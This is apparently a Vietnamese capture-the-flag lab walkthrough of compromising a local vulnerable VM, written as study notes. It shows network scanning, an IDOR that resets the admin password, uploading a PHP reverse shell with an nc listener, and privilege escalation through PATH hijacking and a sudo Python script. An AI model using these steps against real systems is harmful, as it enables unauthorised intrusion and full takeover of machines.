
# LAB 9
## Chuẩn bị
* Máy kali có ip `192.168.8.150` 
![image](https://user-images.githubusercontent.com/91528234/223001588-864ba829-debb-4e86-a0d2-c4fd373427b1.png)
* Máy nạn nhân chưa rõ ip
![image](https://user-images.githubusercontent.com/91528234/223001626-1b94b2e1-c247-41a5-89f4-0768eb8e157d.png)

## Quét mạng

* Mình dùng lệnh `netdiscorver` để quét ip máy nạn nhân
![image](https://user-images.githubusercontent.com/91528234/223001676-c3544566-6a0f-4c61-bf88-cfdd59e08571.png)

* Mình quét được thấy dải ip `192.168.8.152`
* Để tiếp tục quá trình này, chúng tôi sẽ khởi chạy Nmap.
```
nmap -sC -sV 192.168.8.152
```
Trong đó:

-sC: chạy các kịch bản script được tích hợp sẵn để quét port và thu thập thông tin hệ thống. Cờ này tương đương với việc sử dụng tất cả các kịch bản script có sẵn.

-sV: quét phiên bản dịch vụ của các port mở. Nó sẽ cố gắng xác định phiên bản của các dịch vụ được chạy trên các cổng mạng bằng cách truy vấn các cơ sở dữ liệu phiên bản dịch vụ được lưu trữ trong nmap.
![image](https://user-images.githubusercontent.com/91528234/223002728-964bc5f8-89f8-4383-918b-9b538919eb82.png)


* Chúng tôi có, theo đầu ra nmap:

  * trên cổng 22 có máy chủ SSH.

  * một dịch vụ HTTP (Apache Server) chạy trên cổng 80
* Sau đó check trên giao diện web

```
http://192.168.8.152/
```
  ![image](https://user-images.githubusercontent.com/91528234/223002935-ff4569ca-114d-4348-9144-056ae29166c5.png)
* Trong ảnh chụp màn hình ở trên, chúng ta có thể thấy ứng dụng đích. Có một chức năng đăng nhập, vì vậy hãy chuyển đến trang đăng nhập. Trang đăng nhập có thể được nhìn thấy dưới đây.
![image](https://user-images.githubusercontent.com/91528234/223003085-0fe4e76b-724c-4f8d-a9c0-df630872a33d.png)

* Ở đây, chúng tôi có chức năng đăng nhập cũng như đăng ký. Vì vậy, chúng tôi đã nhấp vào 'đăng ký' để đăng ký làm người dùng mới trên ứng dụng mục tiêu
![image](https://user-images.githubusercontent.com/91528234/223003460-4195bc78-ea6a-41a4-967d-02c12d02bc1e.png)
* Chúng tôi đã đăng ký với tư cách là người dùng mới trên máy mục tiêu và yêu cầu với các chi tiết được cung cấp có thể được nhìn thấy ở trên bị chặn trong cửa sổ burp. Hãy sử dụng những chi tiết này để đăng nhập vào ứng dụng mục tiêu.
![image](https://user-images.githubusercontent.com/91528234/223003721-fef80eca-2a37-42ec-bc89-d11f9be0f5a8.png)
* Chúng tôi đã đăng nhập vào ứng dụng mục tiêu bằng tên người dùng và mật khẩu là `321` Chúng tôi đã phân tích ứng dụng mục tiêu để tìm các lỗ hổng và tìm thấy một số lỗ hổng có thể được sử dụng để có lợi cho chúng tôi.

![image](https://user-images.githubusercontent.com/91528234/223003976-3048f1d6-cfc8-4cf2-ad6d-0669a12cae42.png)

* Có chức năng thay đổi mật khẩu cho người dùng hiện tại với lỗi quản lý phiên. Chúng tôi đã chặn yêu cầu thay đổi mật khẩu trong burp và thấy rằng thay đổi mật khẩu phụ thuộc vào tham số id.
![image](https://user-images.githubusercontent.com/91528234/223004177-ab6424d2-07f0-4ef3-90a9-097922cd909b.png)
* Chúng tôi đã thay đổi giá trị id người dùng hiện tại từ `2` thành id của người dùng quản trị viên, tức là `1`. Thông qua đó, chúng tôi có thể thay đổi mật khẩu cho quản trị viên người dùng. Sau đó, chúng tôi đã đăng nhập vào ứng dụng đích với tư cách là quản trị viên người dùng. Chúng tôi bắt đầu khám phá thêm chức năng thông qua người dùng quản trị.
![image](https://user-images.githubusercontent.com/91528234/223005967-d650f0d8-b9c3-4c7d-87de-c77d19eda614.png)
* Chuột phải ấn vào `send repeater` sau đó sáng trang repeater và ấn send
![image](https://user-images.githubusercontent.com/91528234/223006439-f7707c15-d630-4ec8-a0ba-686b3781d3a6.png)
* Vậy là chúng ta đổi thành công mật khẩu `admin` giờ thử đăng nhập vào user `admin` với mật khẩu là `abc` xem như thế nào
![image](https://user-images.githubusercontent.com/91528234/223006728-96b73290-90e5-4e87-a4bd-3109dab522c8.png)
* vậy là đã đăng nhập thành công trang chủ của admin
* Chúng tôi đã tìm thấy chức năng tải tệp lên trong ứng dụng mục tiêu. Nó dễ bị tải lên tệp độc hại. Chúng tôi có thể tải lên trình bao PHP thông qua điều này và có quyền truy cập vào máy mục tiêu.
# Tiêm mã độc
* Trên máy kẻ tấn công của chúng tôi, chúng tôi đã tạo một tải trọng ở dạng trình bao PHP để lấy trình bao đảo ngược từ máy mục tiêu.

* tải file github về máy chủ
```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
```
* copy ra thư mục user
```
cp php-reverse-shell/php-reverse-shell.php shell.phtml
```
* xong sử dụng `vim` để sửa ip thành `192.168.8.150`
![image](https://user-images.githubusercontent.com/91528234/223013231-0734e517-8573-4638-8c51-2660cc153e45.png)
* Tải lên file 
![image](https://user-images.githubusercontent.com/91528234/223013474-6e855fae-256a-4eb2-b86b-2010b5d6f2de.png)
* nhấn vào biểu tưởng file để dẫn ra một đường dẫn khác

![image](https://user-images.githubusercontent.com/91528234/223013648-f68f7bc9-907b-4629-a026-fc1363a4ae49.png)

* Tại máy chủ dùng nc để lắng nghe trên cổng `1234`
```
nc -lvnp 1234
```
* Sang web kích hoạt file `shell.phtml`
* Sau khi kích hoạt bạn đã chiếm được quyền truy cập
![image](https://user-images.githubusercontent.com/91528234/223014076-ed71bcce-3ede-4abc-93c6-e6b58a3c89f3.png)
* Lệnh `python3 -c 'import pty;pty.spawn("/bin/bash")'` sẽ bắt đầu một phiên bản tương tác trên terminal TTY (Teletype) sử dụng module pty của Python để khởi tạo một shell mới trên máy nạn nhân
![image](https://user-images.githubusercontent.com/91528234/223014783-46f859a9-02e7-478a-af4b-d7fffcd0caf1.png)
* Khi bạn thiết lập TERM thành xterm, hệ thống sẽ biết cách hiển thị các ứng dụng dòng lệnh của bạn một cách chính xác trên giao diện xterm, bao gồm cả các tính năng đồ họa và các biểu tượng đặc biệt. Việc này giúp đảm bảo rằng các ứng dụng của bạn hiển thị đúng cách trên giao diện của hệ thống.
```
export TERM=xterm
```
![image](https://user-images.githubusercontent.com/91528234/223014876-8224af90-10dd-413a-8bf4-0b2aca369fa4.png)
* Dùng `ls -l` xem quyền của user trong `/home`

![image](https://user-images.githubusercontent.com/91528234/223015462-021198e4-c09c-4d2d-8505-721f3570bf91.png)
* Có thể thấy user john sở hữu full quyền
* vào thư mục john vào `ls -l`
![image](https://user-images.githubusercontent.com/91528234/223015716-11ac4897-537a-4671-885f-abebd4488f33.png)
* Thấy có file toto được quyền root
* chạy lệnh sau
```
./ toto
cat toto
```
![image](https://user-images.githubusercontent.com/91528234/223015899-49109ac8-37f0-462e-ae2d-1e401b5be735.png)

* Thấy được id của john và file shell chạy lệnh `id`
* Chạy lệnh sau để leo thang đặc quyền với id
```
echo 'bash' > /tmp/id; chmod +x /tmp/id; export PATH=/tmp:$PATH
./toto
cat user.txt
```
![image](https://user-images.githubusercontent.com/91528234/223016510-f3224fa2-378d-4247-9422-cd4855856ee7.png)
## Leo thang với root
* Sau khi xem file `password` có mk là `root123`
![image](https://user-images.githubusercontent.com/91528234/223017353-28af8b33-c8e1-4972-93ef-a5f36d5e1415.png)

* Thực hiện lệnh
```
sudo -l
```
![image](https://user-images.githubusercontent.com/91528234/223017386-ac822b65-7a2a-4441-9123-ee95559d3d01.png)

* Sau khi xem phân quyền file thấy có file `file.py`
* Thực hiên thay đổi file `file.py` bằng câu sau
```
vim file.py
```
```
import os
os.system("/bin/bash")
```
![image](https://user-images.githubusercontent.com/91528234/223017656-26bb857c-4987-4a0c-8c6d-40e719d94c9a.png)
* Sau đó chạy lệnh
```
sudo -u root /usr/bin/python3 /home/john/file.py
```
![image](https://user-images.githubusercontent.com/91528234/223018150-4ffa559e-ce83-4c9a-aa03-fb1d69d34222.png)
* bạn đã vào được user `root`
```
cd /root
ll
cat root.txt
```
![Screenshot from 2023-03-06 11-16-20](https://user-images.githubusercontent.com/91528234/223018260-9baa1eea-72dd-4547-9777-112c56cde393.png)





